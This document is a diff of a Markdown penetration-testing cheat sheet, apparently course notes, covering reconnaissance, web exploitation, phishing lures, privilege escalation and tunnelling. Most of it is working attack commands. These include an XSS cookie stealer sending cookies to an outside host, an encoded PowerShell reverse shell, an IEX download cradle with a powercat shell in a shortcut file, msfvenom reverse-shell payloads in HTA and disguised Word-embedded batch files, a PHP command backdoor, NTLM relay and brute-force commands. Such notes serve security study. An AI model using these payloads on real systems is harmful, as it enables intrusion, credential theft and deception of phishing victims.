@@ -23,18 +23,26 @@ whois 38.100.193.70 -h 192.168.50.251
 host -t mx megacorpone.com
 ```
 
-Attempt the zone transfers
+```bash
+for ip in $(cat list.txt); do host $ip.megacorpone.com; done
 ```
+
+```bash
+for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
+```
+
+Attempt the zone transfers
+
+```bash
 host -l megacorpone.com ns1.megacorpone.com
 ```
 
 `./dns-axfr.sh megacorpone.com`
+
 ```bash
 #!/bin/bash
 
 # Simple Zone Transfer Bash Script
-# $1 is the first argument given after the bash script
-# Check if argument was given, if not, print usage
 
 if [ -z "$1" ]; then
   echo "[*] Simple Zone transfer script"
@@ -42,20 +50,12 @@ if [ -z "$1" ]; then
   exit 0
 fi
 
-# if argument was given, identify the DNS servers for the domain
+# Identify the DNS servers for the domain
 
 for server in $(host -t ns $1 | cut -d " " -f4); do
   # For each of these servers, attempt a zone transfer
   host -l $1 $server |grep "has address"
 done
-```
-
-```bash
-for ip in $(cat list.txt); do host $ip.megacorpone.com; done
-```
-
-```bash
-for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
 ```
 
 Windows **nslookup**
@@ -91,7 +91,6 @@ dnsenum megacorpone.com
 * -u: UDP scan
 
 ```bash
-nc -nvv -z -w 1 192.168.50.152 3388-3390
 nc -nv -u -z -w 1 192.168.50.149 120-123
 ```
 
@@ -113,22 +112,22 @@ done
 echo "Done"
 ```
 
+Windows ping sweep
+
+```bat
+for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.
+```
+
 Checks if an IP responds to ICMP and whether a specified TCP port is open
 
 ```pwsh
 Test-NetConnection -Port 445 192.168.50.151
 ```
 
-Scan the first 1024 ports on the Domain Controller
+Scan the first 1024 ports on a Windows machine
 
 ```pwsh
 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
-```
-
-Ping sweep
-
-```bat
-for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.
 ```
 
 ## Port Scanning with Nmap
@@ -165,11 +164,13 @@ sudo nmap -O 192.168.50.14 --osscan-guess
 ```
 
 ```bash
-sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
+nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
 ```
 
+### Masscan
+
 ```bash
-sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1
+sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tun0 --router-ip 10.11.0.1
 ```
 
 ## SMB Enumeration
@@ -182,7 +183,7 @@ nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.5
 Query the NetBIOS name service for valid NetBIOS names
 
 ```bash
-sudo nbtscan -r 192.168.50.0/24
+nbtscan -r 192.168.50.0/24
 ```
 
 List all the shares running on dc01
@@ -195,8 +196,12 @@ List available shares
 
 ```bash
 smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
+```
 
-crackmapexec smb 192.168.50.242 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares  
+Due to SMB signing being set to False => a relay attacks is possible if we can force an authentication request (impacket-ntlmrelayx)
+
+```bash
+crackmapexec smb 192.168.50.242 -u john -d beyond.com -p "password" --shares
 ```
 
 Mount SMB share on linux
@@ -206,24 +211,19 @@ sudo mkdir /mnt/win10_share
 sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share
 ```
 
-SMB signing set to False => we can potentially perform relay attacks if we can force an authentication request (impacket-ntlmrelayx)
-
 ## NFS Enumeration
 
-Network File System (NFS) is a distributed file system protocol. It allows a user on a client computer to access files over a computer network as if they were on locally-mounted storage.
+Network File System (NFS) allows a user on a client computer to access files over a computer network as if they were on locally-mounted storage.
 
-Both Portmapper and RPCbind run on TCP port 111. RPCbind maps RPC services to the ports on which they listen. RPC processes notify rpcbind when they start, registering the ports they are listening on and the RPC **program numbers** they expect to serve.
+Both Portmapper and RPCbind run on TCP port 111. RPCbind maps RPC services to the ports on which they listen.
 
-The client system then contacts rpcbind on the server with a particular RPC program number. The rpcbind service redirects the client to the proper port number (often TCP port 2049) so it can communicate with the requested service.
+The client system then contacts rpcbind on the server with a particular RPC **program number**. The rpcbind service redirects the client to the proper port number (often TCP port 2049) so it can communicate with the requested service.
 
-Use NSE scripts like rpcinfo to find services that may have registered with rpcbind
+Use NSE scripts to find services that may have registered with rpcbind
 
 ```bash
 nmap -v -p 111 10.11.1.1-254
 nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
-```
-
-```bash
 nmap -p 111 --script nfs* 10.11.1.72
 ```
 
@@ -251,27 +251,13 @@ Interact with the SMTP service
 telnet 192.168.50.8 25
 ```
 
-Install the Telnet client
-
-```pwsh
-dism /online /Enable-Feature /FeatureName:TelnetClient
-```
-
 A **VRFY** request asks the server to verify an email address, while **EXPN** asks the server for the membership of a mailing list
 
-```bash
-nc -nv 192.168.50.8 25
-```
+`nc -nv 192.168.50.8 25`
 
 ```
-(UNKNOWN) [192.168.50.8] 25 (smtp) open
-220 mail ESMTP Postfix (Ubuntu)
-
 VRFY root
-252 2.0.0 root
-
 VRFY idontexist
-550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table
 ```
 
 `python3 smtp.py root 192.168.50.8`
@@ -367,7 +353,7 @@ sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124
 ## Web Application Enumeration
 
 ```bash
-sudo nmap -p80 -sV 192.168.50.20
+nmap -p80 -sV 192.168.50.20
 ```
 
 ```bash
@@ -375,10 +361,10 @@ whatweb http://192.168.50.244
 ```
 
 ```bash
-gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
-
 gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config 
 ```
+
+* -z 10: add a 10 millisecond delay to each request
 
 ```bash
 dirb http://www.megacorpone.com -r -z 10
@@ -388,16 +374,18 @@ dirb http://www.megacorpone.com -r -z 10
 nikto -host=http://www.megacorpone.com -maxtime=30s
 ```
 
-(--enumerate) to include "All Plugins" (ap), "All Themes" (at), "Config backups" (cb), and "Db exports" (dbe). 
+* --enumerate: include "All Plugins" (ap), "All Themes" (at), "Config backups" (cb), and "Db exports" (dbe)
 
 ```bash
 wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
+
 wpscan --url sandbox.local --enumerate ap,at,cb,dbe
 ```
 
 ## Enumerating and Abusing APIs
 
 `pattern.txt`
+
 ```
 {GOBUSTER}/v1
 {GOBUSTER}/v2
@@ -414,33 +402,13 @@ curl -X 'PUT' 'http://192.168.50.16:5002/users/v1/admin/password' -H 'Content-Ty
 ## XSS
 
 ```html
-<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>
+<iframe src=http://10.11.0.4/report height="0" width="0"></iframe>
 ```
 
 Cookie stealer
+
 ```html
 <script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
-```
-
-Simulate an admin user login: `powershell -ExecutionPolicy Bypass -File admin_login.ps1`
-
-`admin_login.ps1`
-```pwsh
-$username="admin"
-$password="p@ssw0rd"
-$url_login="127.0.0.1/login.php"
-
-$ie = New-Object -com InternetExplorer.Application
-$ie.Visible = $true
-$ie.navigate("$url_login")
-while($ie.ReadyState -ne 4){ start-sleep -m 1000}
-$ie.document.getElementsByName("username")[0].value="$username"
-$ie.document.getElementsByName("password")[0].value="$password"
-start-sleep -m 10
-$ie.document.getElementsByClassName("btn")[0].click()
-start-sleep -m 100
-$ie.Quit()
-[System.Runtime.Interopservices.Marshal]::ReleaseComObject($ie)
 ```
 
 **User-Agent** HTTP header: `<script>alert(42)</script>`
@@ -496,7 +464,7 @@ File that is readable by all local users:
 `http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts`
 
 IIS web server => log paths and web root structure.
-* `C:\inetpub\logs\LogFiles\W3SVC1\`.
+* `C:\inetpub\logs\LogFiles\W3SVC1\`
 * `C:\inetpub\wwwroot\web.config` may contain sensitive information like passwords or usernames.
 
 ```bash
@@ -511,7 +479,7 @@ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/etc/passwd
 
 ## File Inclusion Vulnerabilities
 
-XAMPP's Apache logs: `C:\xampp\apache\logs\`.
+XAMPP's Apache logs: `C:\xampp\apache\logs\`
 
 ### LFI
 ```bash
@@ -520,7 +488,7 @@ curl http://mountaindesserts.com/index.php?page=../../var/log/apache2/access.log
 
 ### PHP Wrappers
 
-To display the contents of files either with or without encodings like ROT13 or Base64
+Display the contents of files either with or without encodings like Base64
 
 ```bash
 curl http://mountaindesserts.com/index.php?page=php://filter/resource=admin.php
@@ -528,7 +496,7 @@ curl http://mountaindesserts.com/index.php?page=php://filter/resource=admin.php
 curl http://mountaindesserts.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php
 ```
 
-To embed data elements as plaintext or base64-encoded data in the running web application's code
+Embed data elements as plaintext or base64-encoded data in the running web application's code
 
 ```bash
 curl "http://mountaindesserts.com/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
@@ -543,6 +511,7 @@ curl "http://mountaindesserts.com/index.php?page=data://text/plain;base64,PD9waH
 ### RFI
 
 `simple-backdoor.php`
+
 ```php
 <?php
 if(isset($_REQUEST['cmd'])) {
@@ -569,6 +538,7 @@ Combine with another vulnerability, e.g., Directory Traversal, XXE or XSS:
 To bypass filters that only check for the most common file extensions, change the file extension to **.phps** or **.php7**, **.pHP**.
 
 Use PowerShell to encode the reverse shell one-liner
+
 ```pwsh
 $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
@@ -589,20 +559,6 @@ Determine if our commands are executed by PowerShell or CMD
 ```
 
 ## SQL Injection Attacks
-
-```bash
-mysql -u root -p'root' -h 192.168.50.16 -P 3306
-```
-
-```bash
-mysql --host=127.0.0.1 --port=13306 --user=wp -p
-```
-
-**impacket**
-
-```bash
-impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
-```
 
 Vunerable SQL query:
 `$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";`
@@ -675,6 +631,13 @@ sqlmap -r wp.req -p 'question_id' -D wordpress -T wp_users --dump --technique=T 
 ```
 
 ### MySQL
+
+```bash
+mysql -u root -p'root' -h 192.168.50.16 -P 3306
+
+mysql --host=127.0.0.1 --port=13306 --user=wp -p
+```
+
 ```
 select version();
 select system_user();
@@ -728,7 +691,7 @@ confluence=# select * from cwd_user;
 
 - **.lnk** shortcut files pointing to malicious resources.
 
-- Microsoft Office documents with embedded malicious **macros**. Macros can be written in **Visual Basic for Applications (VBA)**, which is a scripting language with full access to **ActiveX objects** and the Windows Script Host, similar to JavaScript in HTML Applications.
+- Microsoft Office documents with embedded malicious **macros** written in **Visual Basic for Applications (VBA)**, which is a scripting language with full access to **ActiveX objects** and the Windows Script Host, similar to JavaScript in HTML Applications.
 
 - An **HTML Application (HTA)** attached to an email to execute code in the context of Internet Explorer and to some extent, Microsoft Edge.
 
@@ -736,12 +699,11 @@ confluence=# select * from cwd_user;
 
 ## Target Reconnaissance
 
-**Canarytokens**, a free web service that generates a link with an embedded token that we'll send to the target
+**Canarytokens** is a free web service that generates a link with an embedded token that we'll send to the target.
 
 When the target opens the link in a browser => get information about their **browser, IP address, and operating system**
 
 Use an online IP logger like **Grabify or JavaScript fingerprinting libraries** such as **fingerprint.js**
-
 
 ```bash
 exiftool -a -u brochure.pdf
@@ -791,7 +753,7 @@ mkdir /home/kali/webdav
 /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
 ```
 
-The **location of the item** input field of the `automatic_configuration.lnk` shortcut file
+**location of the item** input field of the `automatic_configuration.lnk` shortcut file
 
 ```bat
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1'); powercat -c 192.168.119.3 -p 4444 -e powershell"
@@ -820,6 +782,8 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://1
 </libraryDescription>
 ```
 
+## Email Pretexting and Sending
+
 `body.txt`
 ```
 Hey!
@@ -835,38 +799,39 @@ swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach
 
 ## HTML Application
 
-```html
-<html>
-<head>
-<script>
-  var c= 'cmd.exe'
-  new ActiveXObject('WScript.Shell').Run(c);
-</script>
-</head>
-<body>
-<script>
-  self.close();
-</script>
-</body>
-</html>
-```
-
-Create a payload for an HTA attack since it contains the Base64 encoded payload to be used with PowerShell `powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ.....`
+Create a payload for an HTA attack
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o evil.hta
 ```
 
+```html
+<html>
+  <head>
+    <script>
+      var c= 'powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ.....'
+      new ActiveXObject('WScript.Shell').Run(c);
+    </script>
+  </head>
+  <body>
+    <script>
+      self.close();
+    </script>
+  </body>
+</html>
+```
+
 ## Object Linking and Embedding
 
 `launch.bat`
-```
+
+```bat
 START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....
 ```
 
-Include the above script in a Microsoft Word document.
-
-Open Microsoft Word, create a new document, navigate to the Insert ribbon, and click the Object menu. Choose the Create from File tab and select our newly-created batch script, `launch.bat`. Check the Display as icon check box and choose Change Icon. Even though this is an embedded batch file, Microsoft allows us to pick a different icon for it and enter a caption, which is what the victim will see, rather than the actual file name.
+Include the above script in a Microsoft Word document:
+- Navigate to the **Insert** ribbon, and click the **Object** menu. Choose the **Create from File** tab and select our newly-created batch script, `launch.bat`.
+- Check the **Display as icon** check box and choose Change Icon to pick a different icon for it and enter a caption, which is what the victim will see, rather than the actual file name.
 
 Like Microsoft Word, Microsoft Publisher allows embedded objects and ultimately code execution in exactly the same manner, but will not enable **Protected View** for Internet-delivered documents.
 
@@ -874,25 +839,27 @@ Like Microsoft Word, Microsoft Publisher allows embedded objects and ultimately 
 
 The **Browser Exploitation Framework (BeEF)** tool focuses on client-side attacks executed within a web browser.
 
+Browse to http://127.0.0.1:3000/ui/panel using the default credentials beef/beef to log in
+
+```bash
+beef-xss
+```
+
 ## Locating Public Exploits
 
 ```bash
 searchsploit remote smb microsoft windows
 searchsploit "Sync Breeze Enterprise 10.0.28"
+
 searchsploit -x 50420
-searchsploit -m windows/remote/48537.py
+
 searchsploit -m 42031
+searchsploit -m windows/remote/48537.py
 ```
 
 ```bash
 grep Exploits /usr/share/nmap/scripts/*.nse
 nmap --script-help=clamav-exec.nse
-```
-
-Browse to http://127.0.0.1:3000/ui/panel using the default credentials beef/beef to log in
-
-```bash
-beef-xss
 ```
 
 ## Fixing Exploits
@@ -902,11 +869,13 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thre
 ```
 
 Modify the return address
+
 ```C
 unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83
 ```
 
 ### Cross-Compiling Exploit Code
+
 * -lws2_32: find the **winsock** library
 
 ```bash
@@ -1006,14 +975,12 @@ $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 **Shellter**, a dynamic shellcode injection tool,  backdoor a valid and non-malicious executable file with a malicious shellcode payload. Shellter attempts to use the existing PE **Import Address Table** (IAT) entries to locate functions that will be used for the memory allocation, transfer, and execution of our payload.
 
 ```bash
-apt-cache search shellter
-sudo apt install shellter
+sudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32
 
-sudo apt install wine
-dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+sudo apt install shellter
 ```
 
-Custom (C) payload we generated with msfvenom for shellter
+Generate custom (C) payload with msfvenom for shellter
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw > met.bin
@@ -1035,8 +1002,6 @@ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://
 hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
 ```
 
-HTTP htaccess Attack with Medusa
-
 Attempt to gain access to an htaccess-protected folder, /admin
 
 ```bash
@@ -1052,7 +1017,7 @@ crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
 
 ## Password Cracking
 
-hash type identification
+Hash type identification
 
 ```bash
 hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
@@ -1132,10 +1097,13 @@ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/has
 
 ### Crack Linux-based hashes with JTR
 
-combine the passwd and shadow files from the compromised system
+Combine the passwd and shadow files from the compromised system
 
 ```bash
 unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
+```
+
+```bash
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 ```
 
@@ -1287,7 +1255,7 @@ If the user may be a **local administrator on another machine** => try to use th
 * -c: set our command which will be executed on the target system as the relayed user
 
 ```bash
-sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
 ```
 
 **ntlmrelayx** received an SMB connection and used it to authenticate to our target by relaying it
@@ -1467,23 +1435,27 @@ List applications that do not use the Windows Installer
 wmic product get name, version, vendor
 ```
 
-list system-wide updates by querying the Win32_QuickFixEngineering (qfe)32 WMI class
+List system-wide updates
 
 ```bat
 wmic qfe get Caption, Description, HotFixID, InstalledOn
 ```
 
--u to suppress errors, -w to search for write access permissions, and -s to perform a recursive search
+* -u: suppress errors
+* -w: search for write access permissions
+* -s: perform a recursive search
 
 ```bat
 accesschk.exe -uws "Everyone" "C:\Program Files"
 ```
 
-Search for any object can be modified (Modify) by members of the Everyone group
+Search for any object can be modified by members of the Everyone group
 
 ```pwsh
 Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
 ```
+
+List all drives that are currently mounted as well as those that are physically connected but unmounted
 
 ```bat
 mountvol
@@ -1509,7 +1481,10 @@ reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 ```
 
---dump to view output, and -G to list groups
+`https://github.com/pentestmonkey/windows-privesc-check`
+
+* --dump: view output
+* -G: list groups
 
 ```bat
 windows-privesc-check2.exe --dump -G
@@ -1553,21 +1528,6 @@ Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
 Stop-Transcript
 ```
 
-**PowerShell Remoting** by default uses **WinRM** for Cmdlets such as `Enter-PSSession`. => user needs to be in the local group **Windows Management Users**. However, instead of WinRM, **SSH** can also be used for PowerShell remoting.
-
-Note that creating a PowerShell remoting session via WinRM in a **bind shell** can cause unexpected behavior.
-
-```pwsh
-$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
-
-Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
-```
-
-```bash
-evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
-```
-
 ## Leveraging Windows Services
 
 Windows uses the **LocalSystem** (includes the SIDs of `NT AUTHORITY\SYSTEM` and `BUILTIN\Administrators` in its token), **Network Service**, and **Local Service** user accounts to run its own services.
@@ -1591,7 +1551,15 @@ When using a network logon such as WinRM or a bind shell, `Get-CimInstance` and 
 ```pwsh
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+
 Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
+```
+
+```bat
+wmic service where caption="Serviio" get name, caption, state, startmode
+
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
 ```
 
 **Replacing the binary of a service** needs permissions.
@@ -1600,9 +1568,9 @@ Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object
 icacls "C:\xampp\mysql\bin\mysqld.exe"
 ```
 
-`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
+`adduser.c`
 
-```c
+```C
 #include <stdlib.h>
 
 int main ()
@@ -1614,33 +1582,29 @@ int main ()
 }
 ```
 
+```bash
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+
 ```pwsh
 iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
 move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
 move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
 ```
 
-```pwsh
+```bat
 net stop mysql
-```
-
-```pwsh
-Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
-
-wmic service where caption="Serviio" get name, caption, state, startmode
-
-wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
 ```
 
 Get a list of all privileges, The **Disabled** state only indicates if the privilege is currently enabled for the running process
 
-```pwsh
+```bat
 whoami /priv
 ```
 
 In order to issue a reboot, user needs to have the privilege **SeShutDownPrivilege** assigned.
 
-```pwsh
+```bat
 shutdown /r /t 0
 ```
 
@@ -1679,6 +1643,12 @@ Standard search order taken from the Microsoft Documentation:
 
 When safe DLL search mode is **disabled**, the **current directory is searched at position 2** after the application's directory.
 
+Display the contents of **PATH** environment variable
+
+```pwsh
+$env:path
+```
+
 **Missing DLL**, i.e., the binary attempted to load a DLL that doesn't exist on the system. This often occurs with flawed installation processes or after updates. However, even with a missing DLL, the program may still work with restricted functionality.
 
 => Try placing a malicious DLL (with the name of the missing DLL) in a path of the DLL search order so it executes when the binary is started.
@@ -1709,21 +1679,15 @@ The consecutive function calls follow the DLL search order, starting with the di
 
 => the service binary tries to locate a file called `myDLL.dll`, but fails to do so.
 
-Display the contents of **PATH** environment variable
-
-```pwsh
-$env:path
-```
-
 To abuse this, write a DLL file with this name to a path used by the DLL search order.
 
 Each DLL can have an optional entry point function named DllMain, which is executed when processes or threads attach the DLL. This function generally contains 4 cases named **DLL_PROCESS_ATTACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH**.
 
 These cases handle situations when the DLL is loaded or unloaded by a process or thread. They are commonly used to perform initialization tasks for the DLL or tasks related to exiting the DLL. If a DLL doesn't have a **DllMain** entry point function, it only provides resources.
 
-`mydll.cpp`
+`myDLL.cpp`
 
-```c
+```C
 #include <stdlib.h>
 #include <windows.h>
 
@@ -1806,7 +1770,7 @@ Windows uses the **Task Scheduler** to execute various automated tasks, e.g. cle
 - What triggers are specified for the task? If the trigger condition was met in the past, the task will not run again in the future or if we are in a week-long penetration test, but the task runs after this time
 - What actions are executed when one or more of these triggers are met?
 
-```pwsh
+```bat
 schtasks /query /fo LIST /v
 ```
 
@@ -1826,16 +1790,14 @@ To abuse this, we need to find a privileged process and coerce it into connectin
 
 Other tools that can abuse SeImpersonatePrivilege for privilege escalation: Variants from the **Potato** family (e.g., RottenPotato, SweetPotato, or JuicyPotato (https://github.com/ohpe/juicy-potato)).
 
-```bash
-wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
-```
+`https://github.com/itm4n/PrintSpoofer`
 
 ```pwsh
 .\PrintSpoofer64.exe -i -c powershell.exe
 ```
 
 3 mandatory arguments: -t, -p, and -l.
-* -t: is the "Process creation mode". The documentation states that we need CreateProcessWithToken if we have the SeImpersonate privilege. To direct Juicy Potato to use CreateProcessWithToken, we will pass the t value.
+* -t: is the "Process creation mode". We need CreateProcessWithToken (pass the t value) if we have the SeImpersonate privilege.
 * -p: specifies the program we are trying to run.
 * -l: specify an arbitrary port for the COM server to listen on
 
@@ -1844,13 +1806,6 @@ JuicyPotato.exe -t t -p C:\Users\Public\whoami.exe -l 5837
 ```
 
 # Linux Privilege Escalation
-On Linux-based systems, we must have root privileges to list firewall rules with **iptables**.
-
-The **iptables-persistent** package on Debian Linux saves firewall rules in specific files under `/etc/iptables` by default. These files are used by the system to restore **netfilter** rules at boot time. These files are often left with weak permissions, allowing them to be read by any local user on the target system.
-
-Search for files created by the `iptables-save` command, which is used to dump the firewall configuration to a file specified by the user. This file is then usually used as input for the `iptables-restore` command and used to restore the firewall rules at boot time.
-
-If a system administrator had ever run this command, we could search the configuration directory (`/etc`) or grep the file system for iptables commands to locate the file.
 
 **LinEnum** and **LinPeas**
 
@@ -1890,10 +1845,19 @@ ip route
 
 ```bash
 netstat
+
 ss -anp
 ss -ntplu
 ss -antlp | grep sshd
 ```
+
+On Linux-based systems, we must have root privileges to list firewall rules with **iptables**.
+
+The **iptables-persistent** package on Debian Linux saves firewall rules in specific files under `/etc/iptables` by default. These files are used by the system to restore **netfilter** rules at boot time. These files are often left with weak permissions, allowing them to be read by any local user on the target system.
+
+Search for files created by the `iptables-save` command, which is used to dump the firewall configuration to a file specified by the user. This file is then usually used as input for the `iptables-restore` command and used to restore the firewall rules at boot time.
+
+If a system administrator had ever run this command, we could search the configuration directory (`/etc`) or grep the file system for iptables commands to locate the file.
 
 Files created by the `iptables-save` command, which is used to dump the firewall configuration to a file specified by the user
 
@@ -1901,8 +1865,7 @@ Files created by the `iptables-save` command, which is used to dump the firewall
 cat /etc/iptables/rules.v4
 ```
 
-List cron jobs running
-System administrators often add their own scheduled tasks in the /etc/crontab file
+List cron jobs running (System administrators often add their own scheduled tasks in the `/etc/crontab` file)
 
 ```bash
 ls -lah /etc/cron*
@@ -1961,6 +1924,8 @@ find / -perm -u=s -type f 2>/dev/null
 
 `unix-privesc-check` supports "standard" and "detailed" mode
 
+`https://github.com/pentestmonkey/unix-privesc-check`
+
 ```bash
 ./unix-privesc-check standard > output.txt
 ```
@@ -1986,11 +1951,6 @@ watch -n 1 "ps -aux | grep pass"
 sudo tcpdump -i lo -A | grep "pass"
 sudo tcpdump -nvvvXi tun0 tcp port 8080
 sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
-```
-
-```bash
-sudo -i
-su - root
 ```
 
 ## Abusing Cron Jobs
@@ -2044,7 +2004,7 @@ Enumerate for binaries with capabilities
 Verify AppArmor's status, running as **root**
 
 ```bash
-aa-status
+sudo aa-status
 ```
 
 ## Exploiting Kernel Vulnerabilities
@@ -2080,10 +2040,8 @@ To redirect any traffic received by the Kali web server on port 80 to the google
 `/etc/rinetd.conf`
 
 ```
-...
 # bindadress    bindport  connectaddress  connectport
 0.0.0.0 80 216.58.207.142 80
-...
 ```
 
 ```bash
@@ -2143,7 +2101,8 @@ SSH **remote port forward** as part of our SSH connection from CONFLUENCE to Kal
 ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
 ```
 
--N flag to specify that we are not running any commands. -f option to request ssh to go to the background.
+* -N: specify that we are not running any commands.
+* -f: request ssh to go to the background.
 
 ```bash
 ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
@@ -2183,6 +2142,8 @@ From the Windows machine, create a remote dynamic port forward to our Kali machi
 ssh -N -R 9998 kali@192.168.118.4
 ```
 
+### Plink
+
 Before OpenSSH was available on Windows, most network administrators' tools of choice were **PuTTY** and its command-line-only counterpart, **Plink**. (Plink doesn't have is remote **dynamic** port forwarding)
 
 Create a remote port forward using Plink, Port 9833 is opened on the loopback interface of our Kali machine
@@ -2197,9 +2158,7 @@ A prompt asking if we want to store the server key in the cache
 cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <Kali PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
 ```
 
-```bash
-find / -name plink.exe 2>/dev/null
-```
+### Netsh
 
 The built-in firewall configuration tool **Netsh** (aka **Network Shell**) **requires administrative privileges** to create a port forward on Windows. We can set up a **port forward** with the **portproxy subcontext** within the interface context. (Like **Socat** on Linux)
 
@@ -2251,7 +2210,6 @@ We will run a Chisel **server** on our Kali machine, which will accept a connect
 
 - The Chisel client will then decapsulate it and push it wherever it is addressed.
 
-
 ```bash
 chisel server --port 8080 --reverse
 ```
@@ -2263,7 +2221,7 @@ Connect to the server running on our Kali machine (192.168.118.4:8080)
 
 - The remaining shell redirections (`> /dev/null 2>&1 &`) force the process to run in the background, which will free up our shell
 
-```bat
+```bash
 /tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
 ```
 
